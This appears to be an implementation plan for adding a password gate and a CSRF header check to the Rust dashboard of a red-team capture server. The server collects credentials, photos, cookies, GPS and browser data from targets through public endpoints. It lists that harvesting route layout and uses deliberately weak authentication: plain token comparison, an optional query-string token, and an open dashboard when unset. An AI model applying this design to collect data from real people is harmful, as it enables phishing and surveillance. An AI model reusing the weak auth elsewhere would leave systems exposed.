# Plan 002: Auth Gate & CSRF Protection

> **Executor instructions**: Follow this plan step by step. Run every
> verification command before moving to the next step. If anything in
> "STOP conditions" occurs, stop and report — do not improvise.
>
> **Drift check**: `git diff --stat 68a5f01..HEAD -- backend/src/`
> If any in-scope file changed, compare excerpts against live code.

## Status

- **Priority**: P1
- **Effort**: L
- **Risk**: HIGH (can lock users out of dashboard if done wrong)
- **Depends on**: 001 (rate limiter helpers)
- **Category**: security
- **Planned at**: commit `68a5f01`, 2026-06-21

## Why this matters

The dashboard exposes all captured credentials, photos, cookies, and GPS data with zero authentication. Anyone who discovers the URL (trycloudflare.com subdomains are guessable) can view passwords and delete data. Red team operators need a simple password gate to protect the dashboard while leaving capture endpoints open (they must be unauthenticated to receive data from targets).

## Current state

```rust
// backend/src/main.rs:149-181 — ALL routes are unprotected
// Capture POST endpoints and dashboard GET/DELETE endpoints are on the same router
let api_routes = Router::new()
    .route("/health", get(health))
    .route("/captures", get(api::list_captures).delete(api::delete_all_captures))
    // ...
    .route("/capture/credentials", post(capture::receive_credentials));
```

No auth middleware. No session cookies for operators. No CSRF tokens.

## Commands you will need

| Purpose | Command | Expected |
|---------|---------|----------|
| Check Rust | `cargo check` | exit 0 |
| Test | `cargo test` | all pass |

## Scope

**In scope**:
- `backend/src/main.rs` — add auth middleware, split public vs protected routes
- `backend/src/auth.rs` (new) — auth module with token verification
- `backend/Cargo.toml` — may need `sha2` or `hmac` crate for token hashing

**Out of scope**:
- CAPTCHA or 2FA
- OAuth/SSO
- Per-user accounts (single operator model)
- CSRF on capture endpoints (they need to be callable from recon.js)

## Git workflow

- Branch: `plan/002-auth-csrf`
- Commits: `feat(auth): add dashboard password gate`, `feat(auth): add CSRF protection for DELETE`, `docs: add AUTH_TOKEN to .env.example`
- Do NOT push or open a PR unless instructed

## Steps

### Step 1: Create auth module

Create `backend/src/auth.rs`:

```rust
use axum::{
    extract::FromRequestParts,
    http::{request::Parts, StatusCode, HeaderMap},
    response::{IntoResponse, Response},
};
use std::sync::Arc;
use serde::Serialize;

#[derive(Clone)]
pub struct AuthConfig {
    pub dashboard_token: String,
}

#[derive(Serialize)]
pub struct AuthRequired {
    pub message: &'static str,
}

impl IntoResponse for AuthRequired {
    fn into_response(self) -> Response {
        (StatusCode::UNAUTHORIZED, axum::Json(self)).into_response()
    }
}

/// Extractor that checks Authorization: Bearer <token> or ?token=<token> header
impl<S> FromRequestParts<S> for AuthConfig
where
    S: Send + Sync,
{
    type Rejection = AuthRequired;

    async fn from_request_parts(parts: &mut Parts, _state: &S) -> Result<Self, Self::Rejection> {
        let token = std::env::var("DASHBOARD_TOKEN").unwrap_or_default();
        if token.is_empty() {
            // No token configured — allow all (backward compat)
            return Ok(AuthConfig { dashboard_token: String::new() });
        }

        let provided = parts.headers
            .get("Authorization")
            .and_then(|v| v.to_str().ok())
            .and_then(|v| v.strip_prefix("Bearer "))
            .map(|s| s.to_string())
            .or_else(|| {
                // Check query param
                parts.uri.query().and_then(|q| {
                    url::form_urlencoded::parse(q.as_bytes())
                        .find(|(k, _)| k == "token")
                        .map(|(_, v)| v.to_string())
                })
            });

        match provided {
            Some(p) if p == token => Ok(AuthConfig { dashboard_token: token }),
            _ => Err(AuthRequired { message: "Unauthorized — provide DASHBOARD_TOKEN via Authorization: Bearer <token> header or ?token=<token> query param" }),
        }
    }
}
```

Add `pub mod auth;` to `backend/src/main.rs` module declarations.

### Step 2: Split routes into public and protected

In `backend/src/main.rs`, split the API router:

```rust
// Capture endpoints — public (no auth, targets must reach these):
let capture_routes = Router::new()
    .route("/capture/image", post(capture::receive_image))
    .route("/capture/location", post(capture::receive_location))
    .route("/capture/ip", post(capture::receive_ip))
    .route("/capture/fingerprint", post(capture::receive_fingerprint))
    .route("/capture/event", post(capture::receive_event))
    .route("/capture/storage", post(capture::receive_storage))
    .route("/capture/credentials", post(capture::receive_credentials));

// Dashboard endpoints — protected:
let dashboard_routes = Router::new()
    .route("/health", get(health))
    .route("/stats", get(api::get_stats))
    .route("/captures", get(api::list_captures).delete(api::delete_all_captures))
    .route("/captures/:id", get(api::get_capture).delete(api::delete_capture))
    .route("/captures/:id/file", get(api::serve_capture_file))
    .route("/locations", get(api::list_locations))
    .route("/ips", get(api::list_ips))
    .route("/events", get(api::list_events))
    .route("/templates", get(api::list_templates))
    .route("/sessions", get(api::list_sessions).post(api::create_session))
    .route("/sessions/:id", get(api::get_session).delete(api::delete_session))
    .route("/credentials", get(api::list_credentials).delete(api::delete_all_credentials))
    .route("/credentials/:id", delete(api::delete_credential))
    .route("/storage", get(api::list_storage).delete(api::delete_all_storage))
    .route("/storage/:id", delete(api::delete_storage))
    .layer(axum::middleware::from_fn(auth_middleware));

let api_routes = Router::new()
    .merge(capture_routes)
    .merge(dashboard_routes);
```

Create the auth middleware function:
```rust
async fn auth_middleware<B>(
    req: axum::http::Request<B>,
    next: axum::middleware::Next<B>,
) -> Result<axum::http::Response<axum::body::Body>, AuthRequired> {
    let token = std::env::var("DASHBOARD_TOKEN").unwrap_or_default();
    if token.is_empty() {
        // No token configured — allow all (backward compat)
        return Ok(next.run(req).await);
    }

    let provided = req.headers()
        .get("Authorization")
        .and_then(|v| v.to_str().ok())
        .and_then(|v| v.strip_prefix("Bearer "))
        .map(|s| s.to_string());

    match provided {
        Some(p) if p == token => Ok(next.run(req).await),
        _ => Err(AuthRequired { message: "Unauthorized" }),
    }
}
```

### Step 3: Add CSRF protection for DELETE endpoints

The simplest approach: require a custom header (`X-CSRF-Token`) on all DELETE requests. Since recon.js never sends DELETEs, this won't break capture functionality.

Create a CSRF middleware:
```rust
async fn csrf_middleware<B>(
    req: axum::http::Request<B>,
    next: axum::middleware::Next<B>,
) -> Result<axum::http::Response<axum::body::Body>, StatusCode> {
    if req.method() == axum::http::Method::DELETE {
        let has_csrf = req.headers()
            .get("X-CSRF-Token")
            .or_else(|| req.headers().get("X-Requested-With"))
            .is_some();
        if !has_csrf {
            return Err(StatusCode::FORBIDDEN);
        }
    }
    Ok(next.run(req).await)
}
```

Apply to dashboard routes:
```rust
let dashboard_routes = Router::new()
    // ... all routes
    .layer(axum::middleware::from_fn(csrf_middleware))
    .layer(axum::middleware::from_fn(auth_middleware));
```

### Step 4: Update .env.example and Docker Compose

Add to `.env.example`:
```
# --- Security ---
DASHBOARD_TOKEN=
```

When empty, dashboard is open (backward compat). When set, all dashboard endpoints require `Authorization: Bearer <token>`.

**Verify**: `cargo check` → exit 0

## Test plan

No existing tests. Add:
1. `GET /api/captures` without token when DASHBOARD_TOKEN is set → 401
2. `GET /api/captures` with correct `Authorization: Bearer <token>` → 200
3. `DELETE /api/credentials/x` without CSRF header → 403
4. `DELETE /api/credentials/x` with `X-CSRF-Token: 1` → 204 (or 404, but not 403)
5. `POST /api/capture/image` without token → 200 (public endpoint unaffected)

## Done criteria

- [ ] `cargo check` exits 0
- [ ] `cargo test` exits 0
- [ ] With `DASHBOARD_TOKEN=secret123`, dashboard GET/DELETE without token returns 401
- [ ] With `DASHBOARD_TOKEN=secret123`, dashboard with token returns 200
- [ ] With no DASHBOARD_TOKEN set, dashboard works as before (backward compat)
- [ ] Capture POST endpoints work without token regardless of DASHBOARD_TOKEN setting
- [ ] DELETE without CSRF header returns 403
- [ ] `plans/README.md` status row updated

## STOP conditions

- Code excerpts don't match live files
- Auth middleware blocks legitimate target requests (test capture endpoints thoroughly)
- The `FromRequestParts` implementation has lifetime issues with `uri.query()`

## Maintenance notes

- When adding new dashboard routes, they must be added to the protected router, not the public one.
- The CSRF check is a simple header presence check — not cryptographically signed. This is adequate for a red-team tool but not for production SaaS.
- Backward compatibility (no token = open) is intentional but should be documented.
